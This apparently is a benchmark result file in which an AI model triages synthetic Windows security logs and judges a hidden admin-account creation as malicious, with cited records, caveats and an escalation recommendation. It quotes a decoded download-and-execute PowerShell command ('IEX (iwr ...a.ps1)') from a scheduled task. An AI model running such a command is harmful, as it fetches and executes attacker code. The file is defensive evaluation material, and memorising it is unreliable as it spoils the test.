@@ -1,0 +1,95 @@
+{
+ "scenario_id": "T037",
+ "condition": "C1",
+ "variant": "P2",
+ "backend": "openai:gpt-6.1-sol",
+ "sample": 0,
+ "attempts": [
+  {
+   "answer": "{\n  \"assessment\": \"malicious\",\n  \"confidence\": 0.97,\n  \"supporting_observations\": [\n    {\n      \"claim\": \"At 13:41:49.984 UTC, DC-NWD-01 recorded creation of the NWD domain account sysmaint, SID ending -4460, under sam.okafor's security context.\",\n      \"claim_type\": \"observed_fact\",\n      \"record_ids\": [\"T037-00109\"]\n    },\n    {\n      \"claim\": \"About two seconds later, the same DC subject logon ID, 0x11d4adcd, added sysmaint to a group logged as Administrators. This directly associates the alerted account creation with an administrative-group membership change, although the group's name and SID are inconsistent.\",\n      \"claim_type\": \"observed_fact\",\n      \"record_ids\": [\"T037-00109\", \"T037-00110\"]\n    },\n    {\n      \"claim\": \"At 13:37:55 UTC, WS-LMARTINS-01 recorded a successful remote-interactive logon as sam.okafor from 203.0.113.250, followed by special privileges for the same local logon ID, 0x3fdf003. This source conflicts with the supplied inventory requirement that remote administration originate only from WS-SOKAFOR-01.\",\n      \"claim_type\": \"observed_fact\",\n      \"record_ids\": [\"T037-00074\", \"T037-00075\", \"T037-00076\"]\n    },\n    {\n      \"claim\": \"At 13:41:53 UTC, the same WS-LMARTINS-01 logon session registered the task \\\\Microsoft\\\\Windows\\\\HealthCheck to launch hidden, encoded PowerShell. Its encoded argument decodes to IEX (iwr http://203.0.113.250/a.ps1), referencing the same address as the remote-interactive logon source.\",\n      \"claim_type\": \"observed_fact\",\n      \"record_ids\": [\"T037-00075\", \"T037-00111\"]\n    },\n    {\n      \"claim\": \"The alerted account creation and immediate administrative-group addition, combined with the near-simultaneous download-and-execute task under the same administrator account and the prohibited remote-administration source, support a malicious account-establishment finding rather than routine patching or temporary-account provisioning. The supplied approved practices do not explain these actions.\",\n      \"claim_type\": \"inferred_claim\",\n      \"record_ids\": [\"T037-00075\", \"T037-00109\", \"T037-00110\", \"T037-00111\"]\n    }\n  ],\n  \"known_telemetry_limitations\": [\n    \"The account-creation and membership records identify DC logon ID 0x11d4adcd but do not include its source address. No corresponding authentication record for that DC session is supplied, so it cannot be directly mapped to WS-LMARTINS-01 logon ID 0x3fdf003 (T037-00109, T037-00110, T037-00075).\",\n    \"The membership event labels the destination group Administrators but supplies a domain SID ending -512. Resolve this name/SID inconsistency before asserting the exact group identity (T037-00110).\",\n    \"The scheduled-task record establishes registration and configured command, not successful task execution, payload retrieval, or payload behavior (T037-00111).\"\n  ],\n  \"claims_not_established\": [\n    \"Whether sam.okafor personally performed these actions or another actor used that account's credentials is not established by the security-context attribution (T037-00075, T037-00109, T037-00111).\",\n    \"The supplied records do not establish that the remote-interactive session directly issued the domain-account changes; the events share an account and close timing, but lack a demonstrated cross-host session linkage (T037-00075, T037-00109, T037-00110).\",\n    \"Successful subsequent authentication or use of sysmaint is not established by its creation and membership-change records (T037-00109, T037-00110).\",\n    \"The contents of a.ps1, successful code execution, credential theft, and data exfiltration are not established by the task registration (T037-00111).\"\n  ],\n  \"recommended_action\": \"escalate\",\n  \"additional_evidence_needed\": [\n    \"Retrieve DC authentication and directory-change telemetry for subject logon ID 0x11d4adcd to identify the source of sysmaint creation and group modification (T037-00109, T037-00110).\",\n    \"Resolve the destination group SID and verify sysmaint's current enabled state, memberships, and subsequent authentication history (T037-00109, T037-00110).\",\n    \"Collect Task Scheduler operational logs, PowerShell script-block logs, process telemetry, and network records to determine whether HealthCheck executed or retrieved a.ps1 (T037-00111).\",\n    \"Preserve WS-LMARTINS-01 evidence and validate the remote logon and account changes with sam.okafor through a trusted channel; investigate exposure permitting the recorded inbound RDP connection (T037-00074, T037-00075, T037-00109).\"\n  ],\n  \"unrelated_findings\": [\n    \"Separate software-policy ticket: Dropbox ran under leo.martins on WS-LMARTINS-01, and its updater later ran as SYSTEM. Dropbox is outside the supplied approved file-sharing services; these records do not establish file transfer or a connection to sysmaint creation (T037-00048, T037-00050, T037-00190).\",\n    \"Separate service-account/software-validation ticket: Meridian OpsAgent ran as SYSTEM on WS-LMARTINS-01 and attempted explicit credential use for svc-render targeting PROXY-NWD-01. This differs from svc-render's inventoried RenderQueue role on FILE-NWD-01, but neither successful authentication nor a link to the alerted account creation is established (T037-00117, T037-00119).\"\n  ]\n}",
+   "valid": true,
+   "errors": [],
+   "usage": {
+    "input": 29868,
+    "output": 1366
+   }
+  }
+ ],
+ "parsed": {
+  "assessment": "malicious",
+  "confidence": 0.97,
+  "supporting_observations": [
+   {
+    "claim": "At 13:41:49.984 UTC, DC-NWD-01 recorded creation of the NWD domain account sysmaint, SID ending -4460, under sam.okafor's security context.",
+    "claim_type": "observed_fact",
+    "record_ids": [
+     "T037-00109"
+    ]
+   },
+   {
+    "claim": "About two seconds later, the same DC subject logon ID, 0x11d4adcd, added sysmaint to a group logged as Administrators. This directly associates the alerted account creation with an administrative-group membership change, although the group's name and SID are inconsistent.",
+    "claim_type": "observed_fact",
+    "record_ids": [
+     "T037-00109",
+     "T037-00110"
+    ]
+   },
+   {
+    "claim": "At 13:37:55 UTC, WS-LMARTINS-01 recorded a successful remote-interactive logon as sam.okafor from 203.0.113.250, followed by special privileges for the same local logon ID, 0x3fdf003. This source conflicts with the supplied inventory requirement that remote administration originate only from WS-SOKAFOR-01.",
+    "claim_type": "observed_fact",
+    "record_ids": [
+     "T037-00074",
+     "T037-00075",
+     "T037-00076"
+    ]
+   },
+   {
+    "claim": "At 13:41:53 UTC, the same WS-LMARTINS-01 logon session registered the task \\Microsoft\\Windows\\HealthCheck to launch hidden, encoded PowerShell. Its encoded argument decodes to IEX (iwr http://203.0.113.250/a.ps1), referencing the same address as the remote-interactive logon source.",
+    "claim_type": "observed_fact",
+    "record_ids": [
+     "T037-00075",
+     "T037-00111"
+    ]
+   },
+   {
+    "claim": "The alerted account creation and immediate administrative-group addition, combined with the near-simultaneous download-and-execute task under the same administrator account and the prohibited remote-administration source, support a malicious account-establishment finding rather than routine patching or temporary-account provisioning. The supplied approved practices do not explain these actions.",
+    "claim_type": "inferred_claim",
+    "record_ids": [
+     "T037-00075",
+     "T037-00109",
+     "T037-00110",
+     "T037-00111"
+    ]
+   }
+  ],
+  "known_telemetry_limitations": [
+   "The account-creation and membership records identify DC logon ID 0x11d4adcd but do not include its source address. No corresponding authentication record for that DC session is supplied, so it cannot be directly mapped to WS-LMARTINS-01 logon ID 0x3fdf003 (T037-00109, T037-00110, T037-00075).",
+   "The membership event labels the destination group Administrators but supplies a domain SID ending -512. Resolve this name/SID inconsistency before asserting the exact group identity (T037-00110).",
+   "The scheduled-task record establishes registration and configured command, not successful task execution, payload retrieval, or payload behavior (T037-00111)."
+  ],
+  "claims_not_established": [
+   "Whether sam.okafor personally performed these actions or another actor used that account's credentials is not established by the security-context attribution (T037-00075, T037-00109, T037-00111).",
+   "The supplied records do not establish that the remote-interactive session directly issued the domain-account changes; the events share an account and close timing, but lack a demonstrated cross-host session linkage (T037-00075, T037-00109, T037-00110).",
+   "Successful subsequent authentication or use of sysmaint is not established by its creation and membership-change records (T037-00109, T037-00110).",
+   "The contents of a.ps1, successful code execution, credential theft, and data exfiltration are not established by the task registration (T037-00111)."
+  ],
+  "recommended_action": "escalate",
+  "additional_evidence_needed": [
+   "Retrieve DC authentication and directory-change telemetry for subject logon ID 0x11d4adcd to identify the source of sysmaint creation and group modification (T037-00109, T037-00110).",
+   "Resolve the destination group SID and verify sysmaint's current enabled state, memberships, and subsequent authentication history (T037-00109, T037-00110).",
+   "Collect Task Scheduler operational logs, PowerShell script-block logs, process telemetry, and network records to determine whether HealthCheck executed or retrieved a.ps1 (T037-00111).",
+   "Preserve WS-LMARTINS-01 evidence and validate the remote logon and account changes with sam.okafor through a trusted channel; investigate exposure permitting the recorded inbound RDP connection (T037-00074, T037-00075, T037-00109)."
+  ],
+  "unrelated_findings": [
+   "Separate software-policy ticket: Dropbox ran under leo.martins on WS-LMARTINS-01, and its updater later ran as SYSTEM. Dropbox is outside the supplied approved file-sharing services; these records do not establish file transfer or a connection to sysmaint creation (T037-00048, T037-00050, T037-00190).",
+   "Separate service-account/software-validation ticket: Meridian OpsAgent ran as SYSTEM on WS-LMARTINS-01 and attempted explicit credential use for svc-render targeting PROXY-NWD-01. This differs from svc-render's inventoried RenderQueue role on FILE-NWD-01, but neither successful authentication nor a link to the alerted account creation is established (T037-00117, T037-00119)."
+  ]
+ },
+ "status": "VALID",
+ "faithfulness_precheck": {
+  "n_cited": 12,
+  "n_missing": 0,
+  "missing": []
+ },
+ "duration_s": 20.9
+}
